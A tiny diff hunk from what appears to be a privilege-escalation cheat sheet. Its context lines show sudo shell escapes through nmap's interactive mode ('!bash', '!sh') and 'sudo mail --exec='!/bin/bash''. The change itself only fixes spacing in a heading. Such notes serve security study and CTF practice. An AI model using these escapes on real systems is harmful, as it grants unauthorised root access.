@@ -48,7 +48,7 @@ nmap>!bash
 or
 nmap>!sh
 
-➤Mail
+➤ Mail
 sudo mail --exec='!/bin/bash'
 ```
 
